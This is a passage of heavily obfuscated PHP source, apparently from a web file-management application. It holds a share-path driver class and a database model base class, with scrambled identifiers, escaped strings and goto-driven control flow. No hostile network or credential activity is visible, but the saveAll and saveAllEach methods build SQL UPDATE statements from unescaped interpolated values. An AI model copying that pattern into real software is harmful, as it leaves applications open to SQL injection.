$ešàÖ…“†®, $FÖµ¾£Ÿ, $Fˆ«Ù…©å¢, !0); } protected function _fileOutImage($aï“šÅ•àÜ, $E¤ÚÂ—¸× = 250) { $Añç¢ÉóÅŸ =& $_SERVER[¬ˆÚÂ”Éğä]; $e¬‚´‰ Ã¯ = $this->model->sourceInfo($aï“šÅ•àÜ); if ($e¬‚´‰ Ã¯[$Añç¢ÉóÅŸ[370]] == $Añç¢ÉóÅŸ[83]) { show_json($Añç¢ÉóÅŸ[1135] . $aï“šÅ•àÜ, !1); } $GLOBALS[$Añç¢ÉóÅŸ[1134]] = $e¬‚´‰ Ã¯[$Añç¢ÉóÅŸ[28]]; $eï‘Á´ÛÀ = $this->model->fileInfoGet($aï“šÅ•àÜ); IO::fileOutImage($eï‘Á´ÛÀ[$Añç¢ÉóÅŸ[75]], $E¤ÚÂ—¸×); } public function fileOutImage($b›¨¶Î·Çİ, $e’ÆäºÍ³÷ = 250) { $this->_fileOutImage($b›¨¶Î·Çİ, $e’ÆäºÍ³÷); } public function fileOutImageServer($fŸ”‘­¼º°, $F¢ùçÁïŒ» = 250) { $this->_fileOutImage($fŸ”‘­¼º°, $F¢ùçÁïŒ»); } public function link($A‚¸¤°É´‘, $aèª•êãÛŠ = '') { $C®¨¶ìå±ˆ = $this->model->fileInfoGet($A‚¸¤°É´‘); return IO::link($C®¨¶ìå±ˆ[$_SERVER[¬ˆÚÂ”Éğä][75]], $aèª•êãÛŠ); } protected function parse($C£¿÷ë´) { $AøƒìÊ—è =& $_SERVER[¬ˆÚÂ”Éğä]; if (strstr($C£¿÷ë´, $AøƒìÊ—è[8]) === !1) { return array($AøƒìÊ—è[385] => intval($C£¿÷ë´), $AøƒìÊ—è[75] => $AøƒìÊ—è[33], $AøƒìÊ—è[1131] => array()); } $bƒóí‚Ö¹´ = explode($AøƒìÊ—è[8], trim($C£¿÷ë´, $AøƒìÊ—è[8])); if (count($bƒóí‚Ö¹´) < 2) { show_tips($C£¿÷ë´ . $AøƒìÊ—è[1136]); } return array($AøƒìÊ—è[385] => intval($bƒóí‚Ö¹´[0]), $AøƒìÊ—è[75] => $bƒóí‚Ö¹´[1], $AøƒìÊ—è[1131] => array_slice($bƒóí‚Ö¹´, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($AéÛÊ¦ÔĞ) { $this->pathParse = $AéÛÊ¦ÔĞ; $this->model = Model($_SERVER[¬ˆÚÂ”Éğä][1130]); } public function getPathOuter($A’Ùà»àš’) { $C†»ŒĞò¦æ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$A’Ùà»àš’) { return $A’Ùà»àš’; } $b„›Ä‚š„ = $this->parse($A’Ùà»àš’); return trim(KodIO::makeShare($this->pathParse[$C†»ŒĞò¦æ[367]], $b„›Ä‚š„[$C†»ŒĞò¦æ[367]]), $C†»ŒĞò¦æ[8]); } protected function infoParse($EÎÏõŸì†ó, $dÆ«Î¶¿‹õ = false, $A¿ùÌ‰²”† = false) { $F„Ë§Š±Û =& $_SERVER[¬ˆÚÂ”Éğä]; $Eó„†¢ß× = $this->pathParse[$F„Ë§Š±Û[367]]; $aôõàÎğ = trim($this->pathParse[$F„Ë§Š±Û[1025]], $F„Ë§Š±Û[8]); return Action($F„Ë§Š±Û[1137])->sharePathInfo($Eó„†¢ß×, $aôõàÎğ); } public function infoFull($A˜„÷îÈ³Ì) { $BŠÒó‰ğŒä =& $_SERVER[¬ˆÚÂ”Éğä]; $BùÓ¨¸Âã = explode($BŠÒó‰ğŒä[8], trim($A˜„÷îÈ³Ì, $BŠÒó‰ğŒä[8])); if (count($BùÓ¨¸Âã) > 1) { $Aº«šËËÓÕ = implode($BŠÒó‰ğŒä[8], array_splice($BùÓ¨¸Âã, 1)); $Dõ”èÍˆ¨³ = $this->model->pathInfoByPath($BùÓ¨¸Âã[0], $Aº«šËËÓÕ); if (!$Dõ”èÍˆ¨³) { return !1; } $this->pathParse[$BŠÒó‰ğŒä[1025]] = $Dõ”èÍˆ¨³[$BŠÒó‰ğŒä[369]]; } return $this->infoParse($A˜„÷îÈ³Ì); } public function listAll($aÉóš‡ùõ‰) { goto CÚ‰’—öé; Fòˆè„˜¾: $eÆÁîÌ¥ë™ = $this->model->listAll($aÉóš‡ùõ‰); $d†¸ëÛ­±Ä = Model($eœç´–¹îã[538])->getInfo($Eô©‚õ©¥[$eœç´–¹îã[441]]); $Aççóíèñ” = Action($eœç´–¹îã[1137]); goto dœƒ‘Ù…ö¸; dœƒ‘Ù…ö¸: foreach ($eÆÁîÌ¥ë™ as &$CÀƒè¢×œ) { check_abort(); $CÀƒè¢×œ[$eœç´–¹îã[391]] = $Aççóíèñ”->_shareItemeParse($CÀƒè¢×œ[$eœç´–¹îã[391]], $d†¸ëÛ­±Ä); } unset($CÀƒè¢×œ); return $eÆÁîÌ¥ë™; goto Fˆàøäí¿; CÚ‰’—öé: $eœç´–¹îã =& $_SERVER[¬ˆÚÂ”Éğä]; $Eô©‚õ©¥ = IO::info($this->pathParse[$eœç´–¹îã[75]]); if (!$Eô©‚õ©¥) { return array(); } goto Fòˆè„˜¾; Fˆàøäí¿: } } goto eäµ¯¡ÄÑ±; aàŞĞÒ—™ã: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\x79\124\x69\155\145", "\164\151\155\145", "\x69\x6e\163\x65\162\164\54\165\x70\x64\141\x74\x65", "\x66\165\156\x63\x74\x69\157\156"), array("\143\x72\145\x61\164\145\124\x69\155\x65", "\164\x69\155\x65", "\x69\156\163\x65\162\x74", "\x66\x75\x6e\143\164\151\x6f\x6e")); public function setDataAuto($d¯•Ş‘”§š) { $this->dataAuto = $d¯•Ş‘”§š; } public function __construct($cŸµÙ¸´šæ = '', $D‚´Æ¨áâ = '', $A²»Ëá = '') { parent::__construct($cŸµÙ¸´šæ, $D‚´Æ¨áâ, $A²»Ëá); } public static function textEncode($F¹‚ùÂŠŸÖ) { if (!$F¹‚ùÂŠŸÖ) { return $F¹‚ùÂŠŸÖ; } $E¡èª˜ÙƒÔ = json_encode($F¹‚ùÂŠŸÖ); $E¡èª˜ÙƒÔ = preg_replace_callback($_SERVER[¬ˆÚÂ”Éğä][342], function ($DƒĞÕÕ««) { return addslashes($DƒĞÕÕ««[0]); }, $E¡èª˜ÙƒÔ); return json_decode($E¡èª˜ÙƒÔ); } public static function textDecode($f‡±ñÑ¯íí) { $d ŒèÏ»İ‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $D­²‘®ò™ = json_encode($f‡±ñÑ¯íí); $D­²‘®ò™ = preg_replace_callback($d ŒèÏ»İ‚[343], function ($eÒÅßöÁÈ) { return $_SERVER[¬ˆÚÂ”Éğä][93]; }, $D­²‘®ò™); return json_decode($D­²‘®ò™); } protected $tableMeta = array(); protected function _beforeInsert(&$f¸Ó©ÇŒÕÕ, $a¼Ìç‰ÍÆ) { $CÒÄí§¿ “ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->checkDataAutoHas($CÒÄí§¿ “[344])) { return; } $this->dataBeforeFilter($f¸Ó©ÇŒÕÕ, $CÒÄí§¿ “[344]); } protected function _beforeUpdate(&$D§¿˜ÓŒ’•, $B©éÎé«‹Ã) { $E»”ÌÔ¥æ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->checkDataAutoHas($E»”ÌÔ¥æ[345])) { return; } $this->dataBeforeFilter($D§¿˜ÓŒ’•, $E»”ÌÔ¥æ[345]); } protected function _afterSelect(&$CÁ·èÁÈØ, $Aéñ£®›µĞ) { if (!is_array($CÁ·èÁÈØ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¬ˆÚÂ”Éğä][346])) { return; } foreach ($CÁ·èÁÈØ as &$AÂ½îô„·è) { $this->dataAfterFilter($AÂ½îô„·è); } unset($AÂ½îô„·è); } protected function _afterFind(&$f¹†åâ‹ï¾, $aŒ÷ˆø¼ÛØ) { if (!is_array($f¹†åâ‹ï¾)) { return; } if (!$this->checkDataAutoHas($_SERVER[¬ˆÚÂ”Éğä][346])) { return; } $this->dataAfterFilter($f¹†åâ‹ï¾); } public function setAutoIncrement($eˆáêšê¼‘) { $f§›Ì‡½ = array($this->getPk() => $eˆáêšê¼‘); $cï›Û¡ù”ß = $this->data($f§›Ì‡½)->add(); if ($cï›Û¡ù”ß) { $this->delete($cï›Û¡ù”ß); } } public function getAutoIncrement() { $AÅ›­Áù¦„ = $this->getTableName(); $d›Ë¨ºÕ Õ = $this->max($this->getPk()); $Då¼ŒŞ´×Â = $this->query("\163\x68\157\x77\40\164\x61\142\154\x65\40\163\x74\x61\164\x75\x73\40\x77\150\x65\x72\145\x20\x4e\141\x6d\145\75\47{$AÅ›­Áù¦„}\47"); $cæÒ“¼½Œİ = $Då¼ŒŞ´×Â[0][$_SERVER[¬ˆÚÂ”Éğä][347]]; $F¡ÚÆ®¶ù = max($d›Ë¨ºÕ Õ, $cæÒ“¼½Œİ); return $F¡ÚÆ®¶ù; } protected function _callBefore($EßÜ‹Úâö, $CŒ­É®‰Ô) { return $this->cacheCallCheck($EßÜ‹Úâö, $CŒ­É®‰Ô, !1); } protected function _callAfter($Dï‘±à›éÎ, $d¢à‰Şœ‡‰) { return $this->cacheCallCheck($Dï‘±à›éÎ, $d¢à‰Şœ‡‰, !0); } protected function cacheFunctionAlias($dè¨¡…È‰‚) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b…ÅÖ’”†¿, $dÎ‡¡¯×ë, $aÂóêŒÇÉƒ = false) { $BÔÆØ•œÚÓ = $this->cacheFunctionAlias($dÎ‡¡¯×ë); if (!$BÔÆØ•œÚÓ) { return; } foreach ($BÔÆØ•œÚÓ as $A·ÑŠ¼³Ï => $a¦à‚Å‘ä¿) { $AùÔÈŞ¬– = $a¦à‚Å‘ä¿[0]; $Aíæ«äá÷Ó = explode($_SERVER[¬ˆÚÂ”Éğä][47], $a¦à‚Å‘ä¿[1]); if ($b…ÅÖ’”†¿ == $A·ÑŠ¼³Ï) { return $this->cacheFunctionGet($A·ÑŠ¼³Ï, $AùÔÈŞ¬–); } if ($aÂóêŒÇÉƒ && in_array($b…ÅÖ’”†¿, $Aíæ«äá÷Ó)) { $this->cacheFunctionClear($A·ÑŠ¼³Ï, $AùÔÈŞ¬–); } } } public function cacheFunctionGet($e†„’¥§ÀŠ, $Bì¸¨É×á›) { $FìÀº’Ûš = $this->cacheKeyMake($e†„’¥§ÀŠ, $Bì¸¨É×á›); $dˆ¨ø±ìñÊ = Cache::get($FìÀº’Ûš); if (!is_array($dˆ¨ø±ìñÊ)) { $dˆ¨ø±ìñÊ = call_user_func_array(array($this, $e†„’¥§ÀŠ), array($Bì¸¨É×á›, !0)); Cache::set($FìÀº’Ûš, $dˆ¨ø±ìñÊ); } return $dˆ¨ø±ìñÊ; } public function cacheFunctionClear($D”ó²©­š, $bèî› ‡Š) { $FçôŠæí¬Á = $bèî› ‡Š; if (!is_array($bèî› ‡Š)) { $FçôŠæí¬Á = array($bèî› ‡Š); } foreach ($FçôŠæí¬Á as $a³Ÿò¸è­») { $DÁµÉš¹— = $this->cacheKeyMake($D”ó²©­š, $a³Ÿò¸è­»); Cache::remove($DÁµÉš¹—); } } private function cacheKeyMake($a°íãœŸÆ, $eáÀƒ¯°†İ) { $BĞÑ¼õçî¯ =& $_SERVER[¬ˆÚÂ”Éğä]; return get_class($this) . $BĞÑ¼õçî¯[70] . $a°íãœŸÆ . $BĞÑ¼õçî¯[348] . $eáÀƒ¯°†İ; } protected function selectPage($d±âéÀë = 200, $FØãŠ†êœÉ = 1) { goto fÚ¡ÆĞê; D´íö°ÀÁ²: $bÜ´ öÏÈ = 4000; $d±âéÀë = isset($in[$FÕøº¥¹ƒ®[349]]) ? $in[$FÕøº¥¹ƒ®[349]] : $d±âéÀë; if ($d±âéÀë === -1) { unset($in[$FÕøº¥¹ƒ®[349]]); $bÜ´ öÏÈ = 100000000; $d±âéÀë = $bÜ´ öÏÈ; } goto CÄ˜§ôœŒ; Bğ¥ï¤İ˜î: $this->optionsValue($E·‹ùÙ°İ‚); $d£ÒÑâàí‚ = $this->page($FØãŠ†êœÉ, $d±âéÀë)->select(); $d£ÒÑâàí‚ = is_array($d£ÒÑâàí‚) ? $d£ÒÑâàí‚ : array(); goto DâòŞˆÇÉî; DâòŞˆÇÉî: if ($D÷‘ÉÆ‚Ü == 1) { $cŸäµÛ¿¢ = count($d£ÒÑâàí‚); } $d×õ•åğÄÃ = array($FÕøº¥¹ƒ®[351] => array($FÕøº¥¹ƒ®[352] => $cŸäµÛ¿¢, $FÕøº¥¹ƒ®[349] => $d±âéÀë, $FÕøº¥¹ƒ®[340] => $FØãŠ†êœÉ, $FÕøº¥¹ƒ®[353] => $D÷‘ÉÆ‚Ü), $FÕøº¥¹ƒ®[354] => $d£ÒÑâàí‚ ? $d£ÒÑâàí‚ : array()); return $d×õ•åğÄÃ; goto E‘Í¯Ñ¬ëë; Eî­‡Ğõœå: $D÷‘ÉÆ‚Ü = ceil($cŸäµÛ¿¢ / $d±âéÀë); $FØãŠ†êœÉ = intval(isset($in[$FÕøº¥¹ƒ®[340]]) ? $in[$FÕøº¥¹ƒ®[340]] : $FØãŠ†êœÉ); $FØãŠ†êœÉ = $FØãŠ†êœÉ <= 1 ? 1 : ($FØãŠ†êœÉ >= $D÷‘ÉÆ‚Ü ? $D÷‘ÉÆ‚Ü : $FØãŠ†êœÉ); goto Bğ¥ï¤İ˜î; CÄ˜§ôœŒ: $Dç‚Û‰ç® = $E·‹ùÙ°İ‚; $Dç‚Û‰ç®[$FÕøº¥¹ƒ®[350]] = array(); $this->optionsValue($Dç‚Û‰ç®); goto AêÑñ™ñÁ¯; AêÑñ™ñÁ¯: $cŸäµÛ¿¢ = intval($this->count()); $d±âéÀë = intval($d±âéÀë); $d±âéÀë = $d±âéÀë <= 5 ? 5 : ($d±âéÀë >= $bÜ´ öÏÈ ? $bÜ´ öÏÈ : $d±âéÀë); goto Eî­‡Ğõœå; fÚ¡ÆĞê: $FÕøº¥¹ƒ® =& $_SERVER[¬ˆÚÂ”Éğä]; global $in; $E·‹ùÙ°İ‚ = $this->optionsValue(); goto D´íö°ÀÁ²; E‘Í¯Ñ¬ëë: } protected function checkLength($EôÜè²ø³Â, $eß©ŒŸİâê = 0, $d•òƒ‘ò³¯ = '') { $cã­„×•İ =& $_SERVER[¬ˆÚÂ”Éğä]; $eß©ŒŸİâê = $eß©ŒŸİâê ? $eß©ŒŸİâê : 65536; if (!$EôÜè²ø³Â || strlen($EôÜè²ø³Â) < $eß©ŒŸİâê) { return; } $d•òƒ‘ò³¯ = $d•òƒ‘ò³¯ ? $d•òƒ‘ò³¯ . $cã­„×•İ[67] : $cã­„×•İ[33]; show_json($d•òƒ‘ò³¯ . LNG($cã­„×•İ[355]) . "\50{$eß©ŒŸİâê}\51", !1); } protected function metaSet($a²Æ˜İ÷Ä‘, $dÁÛƒÛ¤ÓÛ = null, $AÍÙÌà¡Š = null) { goto d¼®µŠøø´; D¿½æ˜·˜·: $CÒ’á¦“• = $this->tableMeta[$Eíâœäœ—¼[357]]; $a¨½Ÿ‡ñ§› = Model($CÒ’á¦“•); $F·šŒ¼„›‚ = array($fÀ“ğ¦¹È => $a²Æ˜İ÷Ä‘, $Eíâœäœ—¼[358] => $dÁÛƒÛ¤ÓÛ); goto c¼–Â’Âä¾; d‡£†¦Ø¸: $a¨½Ÿ‡ñ§›->where(array($fÀ“ğ¦¹È => $a²Æ˜İ÷Ä‘))->addAll($e¢Ö¦ãô£Ó, array(), !0); return !0; goto a©ÉëÆ; d¼®µŠøø´: $Eíâœäœ—¼ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->tableMeta) { return !1; } $fÀ“ğ¦¹È = $this->tableMeta[$Eíâœäœ—¼[356]]; goto D¿½æ˜·˜·; eòåï´±Œ£: if (is_string($dÁÛƒÛ¤ÓÛ)) { $Bò•÷Í®Ò[$dÁÛƒÛ¤ÓÛ] = $AÍÙÌà¡Š; } $e¢Ö¦ãô£Ó = array(); foreach ($Bò•÷Í®Ò as $b´”ÅÕõò => $B‘¤˜‚×é) { $this->checkLength($B‘¤˜‚×é, !1, $CÒ’á¦“• . $Eíâœäœ—¼[4] . $b´”ÅÕõò); $e¢Ö¦ãô£Ó[] = array($fÀ“ğ¦¹È => $a²Æ˜İ÷Ä‘, $Eíâœäœ—¼[89] => $b´”ÅÕõò, $Eíâœäœ—¼[359] => $B‘¤˜‚×é); } goto d‡£†¦Ø¸; c¼–Â’Âä¾: if (is_null($dÁÛƒÛ¤ÓÛ)) { return $a¨½Ÿ‡ñ§›->where(array($fÀ“ğ¦¹È => $a²Æ˜İ÷Ä‘))->delete(); } if (is_null($AÍÙÌà¡Š) && is_string($dÁÛƒÛ¤ÓÛ)) { return $a¨½Ÿ‡ñ§›->where($F·šŒ¼„›‚)->delete(); } $Bò•÷Í®Ò = is_array($dÁÛƒÛ¤ÓÛ) ? $dÁÛƒÛ¤ÓÛ : array(); goto eòåï´±Œ£; a©ÉëÆ: } public function metaGet($EœƒÙô„¶¨, $bªïÏŞ±· = false) { goto eåŠìò¯à½; EêöÉ±«Ú: $FĞĞ¾²¸¡ = $c…¿¶ƒÓï->field($aÜÓŸ¬„‹[360])->where($e±ÀÙÍ‹êô)->select(); $FĞĞ¾²¸¡ = array_to_keyvalue($FĞĞ¾²¸¡, $aÜÓŸ¬„‹[89], $aÜÓŸ¬„‹[359]); return $FĞĞ¾²¸¡; goto dø±ğÃñ¯Õ; eåŠìò¯à½: $aÜÓŸ¬„‹ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->tableMeta) { return array(); } $B‹¢¬Œ³ÒÈ = $this->tableMeta[$aÜÓŸ¬„‹[356]]; goto aµ¯•ºï; aµ¯•ºï: $c…¿¶ƒÓï = Model($this->tableMeta[$aÜÓŸ¬„‹[357]]); if ($bªïÏŞ±·) { $e±ÀÙÍ‹êô = array($B‹¢¬Œ³ÒÈ => $EœƒÙô„¶¨, $aÜÓŸ¬„‹[89] => $bªïÏŞ±·); return $c…¿¶ƒÓï->where($e±ÀÙÍ‹êô)->getField($aÜÓŸ¬„‹[359]); } $e±ÀÙÍ‹êô = array($B‹¢¬Œ³ÒÈ => $EœƒÙô„¶¨); goto EêöÉ±«Ú; dø±ğÃñ¯Õ: } private function checkDataAutoHas($eÎ¥Ô‡“ô…) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e¥Ş‚ç‰´…) { if (in_array($eÎ¥Ô‡“ô…, explode($_SERVER[¬ˆÚÂ”Éğä][47], $e¥Ş‚ç‰´…[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$e¯†ÄÖÜ¤, $Cˆö¼Š‡è) { $B™™ßôå =& $_SERVER[¬ˆÚÂ”Éğä]; foreach ($this->dataAuto as $B•¯¢­µ¹») { $b¸Á‘Œ±®Î = $B•¯¢­µ¹»[0]; if (!in_array($Cˆö¼Š‡è, explode($B™™ßôå[47], $B•¯¢­µ¹»[2]))) { continue; } switch (trim($B•¯¢­µ¹»[3])) { case $B™™ßôå[309]: case $B™™ßôå[310]: $bšŠš¯İ« = $B•¯¢­µ¹»[1]; $d¼ÆØ«¼¸ = isset($B•¯¢­µ¹»[4]) ? (array) $B•¯¢­µ¹»[4] : array(); if ($bšŠš¯İ« == $B™™ßôå[190] && array_key_exists($b¸Á‘Œ±®Î, $e¯†ÄÖÜ¤)) { if (!$e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î]) { unset($e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î]); } break; } if (isset($e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î])) { array_unshift($d¼ÆØ«¼¸, $e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î]); } if ($B™™ßôå[309] == $B•¯¢­µ¹»[3]) { $e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î] = call_user_func_array($bšŠš¯İ«, $d¼ÆØ«¼¸); } else { $e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î] = call_user_func_array(array(&$this, $bšŠš¯İ«), $d¼ÆØ«¼¸); } break; case $B™™ßôå[261]: $e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î] = $e¯†ÄÖÜ¤[$B•¯¢­µ¹»[1]]; break; case $B™™ßôå[282]: if (isset($e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î]) && !is_string($e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î])) { $e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î] = json_encode_force($e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î]); } break; case $B™™ßôå[311]: if ($e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î] === $B™™ßôå[33]) { unset($e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î]); } break; case $B™™ßôå[312]: $e¯†ÄÖÜ¤[$b¸Á‘Œ±®Î] = $B•¯¢­µ¹»[1]; default: break; } } if ($Cˆö¼Š‡è == $B™™ßôå[344]) { $eòì»ÖË…ó = strtolower($this->db->getDbType()); if (strpos($eòì»ÖË…ó, $B™™ßôå[9]) !== 0) { return; } $AËä«½Î˜£ = $this->field(!0)->fields; $CÆãÃ‹÷å¼ = $AËä«½Î˜£[$B™™ßôå[240]]; if (isset($AËä«½Î˜£[$B™™ßôå[239]])) { unset($CÆãÃ‹÷å¼[$AËä«½Î˜£[$B™™ßôå[239]]]); } foreach ($CÆãÃ‹÷å¼ as $A’ìà ìîŒ => $Cˆö¼Š‡è) { if (!isset($e¯†ÄÖÜ¤[$A’ìà ìîŒ])) { $e¯†ÄÖÜ¤[$A’ìà ìîŒ] = $B™™ßôå[33]; } } } } private function dataAfterFilter(&$cøîŸ’´Ë×) { $e³Éİ½ßÎ =& $_SERVER[¬ˆÚÂ”Éğä]; foreach ($this->dataAuto as $F–Œ¢ÒÁ á) { $cø‚½êç— = $F–Œ¢ÒÁ á[0]; if (!in_array($e³Éİ½ßÎ[346], explode($e³Éİ½ßÎ[47], $F–Œ¢ÒÁ á[2]))) { continue; } if (!isset($cøîŸ’´Ë×[$cø‚½êç—])) { continue; } switch (trim($F–Œ¢ÒÁ á[3])) { case $e³Éİ½ßÎ[309]: case $e³Éİ½ßÎ[310]: $A…Ôá¡É± = isset($F–Œ¢ÒÁ á[4]) ? (array) $F–Œ¢ÒÁ á[4] : array(); array_unshift($A…Ôá¡É±, $cøîŸ’´Ë×[$cø‚½êç—]); if ($e³Éİ½ßÎ[309] == $F–Œ¢ÒÁ á[3]) { $cøîŸ’´Ë×[$cø‚½êç—] = call_user_func_array($F–Œ¢ÒÁ á[1], $A…Ôá¡É±); } else { $cøîŸ’´Ë×[$cø‚½êç—] = call_user_func_array(array(&$this, $F–Œ¢ÒÁ á[1]), $A…Ôá¡É±); } break; case $e³Éİ½ßÎ[261]: $cøîŸ’´Ë×[$cø‚½êç—] = $cøîŸ’´Ë×[$F–Œ¢ÒÁ á[1]]; break; case $e³Éİ½ßÎ[282]: $bØ¥ÎôÒá = $cøîŸ’´Ë×[$cø‚½êç—]; $cøîŸ’´Ë×[$cø‚½êç—] = json_decode($bØ¥ÎôÒá, !0); if (is_null($cøîŸ’´Ë×[$cø‚½êç—])) { $cøîŸ’´Ë×[$cø‚½êç—] = $bØ¥ÎôÒá; } break; case $e³Éİ½ßÎ[311]: if ($cøîŸ’´Ë×[$cø‚½êç—] === $e³Éİ½ßÎ[33]) { unset($cøîŸ’´Ë×[$cø‚½êç—]); } break; case $e³Éİ½ßÎ[312]: $cøîŸ’´Ë×[$cø‚½êç—] = $F–Œ¢ÒÁ á[1]; default: break; } } } public function saveAll($DÈŸßĞÈÏˆ) { goto A¯·ˆ¡˜¼; A¯·ˆ¡˜¼: $eÁ­¹¦½Øª =& $_SERVER[¬ˆÚÂ”Éğä]; $e‹©‹ ±ôË = $this->tablePrefix . $this->tableName; $dÃĞƒ×“àó = self::SQL_WHERE_IN_CHUNK; goto Bé›„‚§ÖØ; FËï®§À×: $AñÆ•Æ¿‰´ = array(); $aœ†¹È©‰‘ = count($DÈŸßĞÈÏˆ); for ($fÜ°Ößä«œ = 0; $fÜ°Ößä«œ < $aœ†¹È©‰‘; $fÜ°Ößä«œ++) { $båùĞº¿Ë = $DÈŸßĞÈÏˆ[$fÜ°Ößä«œ]; if (!is_array($båùĞº¿Ë) || count($båùĞº¿Ë) != 4) { continue; } $b‡¨Š®À«É = "\125\x50\104\101\x54\105\40\140{$e‹©‹ ±ôË}\140\x20\123\105\x54\40{$båùĞº¿Ë[2]}\40\x3d\40\x43\x41\x53\105\x20{$båùĞº¿Ë[0]}\x20\12"; if ($aŒÃ––Çõ == 0) { $c¿ê»½—³— = $b‡¨Š®À«É; } $AñÆ•Æ¿‰´[] = $eÁ­¹¦½Øª[113] . $båùĞº¿Ë[1] . $eÁ­¹¦½Øª[113]; $aŒÃ––Çõ++; $c¿ê»½—³— .= "\x20\x57\110\x45\x4e\x20\47{$båùĞº¿Ë[1]}\47\x20\124\110\105\x4e\40\47{$båùĞº¿Ë[3]}\47\x20\xa"; if ($aŒÃ––Çõ == $dÃĞƒ×“àó || $fÜ°Ößä«œ == $aœ†¹È©‰‘ - 1) { goto FÉ¼‚Âôİ­; FÉ¼‚Âôİ­: $b¼ùĞÕ¸÷ = implode($eÁ­¹¦½Øª[47], $AñÆ•Æ¿‰´); $c¿ê»½—³— .= "\40\x45\x4e\x44\40\40\127\x48\105\x52\105\x20{$båùĞº¿Ë[0]}\x20\x49\116\x20\50{$b¼ùĞÕ¸÷}\51\x20"; $this->execute($c¿ê»½—³—); goto c˜ˆ¼¤‰›ß; c˜ˆ¼¤‰›ß: $aŒÃ––Çõ = 0; $c¿ê»½—³— = $b‡¨Š®À«É; $this->chunkEventCheck(count($AñÆ•Æ¿‰´)); goto E¼Óã…ØæÔ; E¼Óã…ØæÔ: $AñÆ•Æ¿‰´ = array(); goto E±éÄïÕÕ; E±éÄïÕÕ: } } goto BƒÔí·ßÎÈ; BƒÔí·ßÎÈ: $this->chunkEventSet(); goto bİÔ§ßÚ”Ú; Bé›„‚§ÖØ: $DÈŸßĞÈÏˆ = is_array($DÈŸßĞÈÏˆ) ? $DÈŸßĞÈÏˆ : array(); $c¿ê»½—³— = $eÁ­¹¦½Øª[361]; $aŒÃ––Çõ = 0; goto FËï®§À×; bİÔ§ßÚ”Ú: } public function saveAllEach($C¯ì¾í…›À) { $Cğôùó½À =& $_SERVER[¬ˆÚÂ”Éğä]; $fƒİÚæ§œˆ = $this->tablePrefix . $this->tableName; foreach ($C¯ì¾í…›À as $CªÂèİùÄÉ) { if (!is_array($CªÂèİùÄÉ) || count($CªÂèİùÄÉ) != 4) { continue; } $aÇ‚±æ©¿š = $CªÂèİùÄÉ[0] . $Cğôùó½À[362] . $CªÂèİùÄÉ[1] . $Cğôùó½À[113]; $a¢óø££¤ï = $CªÂèİùÄÉ[2] . $Cğôùó½À[362] . $CªÂèİùÄÉ[3] . $Cğôùó½À[113]; $DÑ„¾ŠÜ”‚ = "\x75\x70\144\x61\x74\145\40{$fƒİÚæ§œˆ}\40\163\x65\164\40{$a¢óø££¤ï}\40\167\150\x65\162\145\40{$aÇ‚±æ©¿š}\73"; $this->execute($DÑ„¾ŠÜ”‚); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($aÕ¼ö…“ÖÈ = false, $bÛ£À’Í‹ = false) { $this->_chunkEvent = $aÕ¼ö…“ÖÈ; $this->_chunkEventParam = $bÛ£À’Í‹; } private function chunkEventCheck($A‡ÌÇ„É¨Š) { if (!$this->_chunkEvent) { return; } $AÀ³÷Ä‹Ü˜ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $AÀ³÷Ä‹Ü˜[$_SERVER[¬ˆÚÂ”Éğä][363]] = $A‡ÌÇ„É¨Š; Hook::trigger($this->_chunkEvent, $AÀ³÷Ä‹Ü˜); } public function addAll($eŸì£¾ñ‘Ë, $fêÓóÁ¾÷  = array(), $Aåå¾Ù´Ÿç = false) { goto d–¾õ–‚³Š; d–¾õ–‚³Š: $eÛÕòÀ¸©µ =& $_SERVER[¬ˆÚÂ”Éğä]; ignore_timeout(); $bÇ¯Ã—¨ = self::SQL_WHERE_IN_CHUNK; goto bŞ×ê“Ä¸ó; bŞ×ê“Ä¸ó: if (empty($eŸì£¾ñ‘Ë)) { $this->error = think_lang($eÛÕòÀ¸©µ[259]); return !1; } $fêÓóÁ¾÷  = $this->_parseOptions($fêÓóÁ¾÷ ); foreach ($eŸì£¾ñ‘Ë as $a¿ºë¾­´ => $C†Úó®ğË) { $eŸì£¾ñ‘Ë[$a¿ºë¾­´] = $this->_facade($C†Úó®ğË); $this->_beforeInsert($eŸì£¾ñ‘Ë[$a¿ºë¾­´], $fêÓóÁ¾÷ ); } goto F”¹êÇôğÆ; F”¹êÇôğÆ: if (method_exists($this->db, $eÛÕòÀ¸©µ[260])) { for ($d»š¶’À¦¹ = 0; $d»š¶’À¦¹ < count($eŸì£¾ñ‘Ë); $d»š¶’À¦¹ += $bÇ¯Ã—¨) { $AíìØ‡‚ª” = array_slice($eŸì£¾ñ‘Ë, $d»š¶’À¦¹, $bÇ¯Ã—¨); if (!is_array($AíìØ‡‚ª”) || count($AíìØ‡‚ª”) == 0) { break; } $c²ÙÒòƒƒğ = $this->db->insertAll($AíìØ‡‚ª”, $fêÓóÁ¾÷ , $Aåå¾Ù´Ÿç); $this->chunkEventCheck(count($AíìØ‡‚ª”)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eŸì£¾ñ‘Ë as $a¿ºë¾­´ => 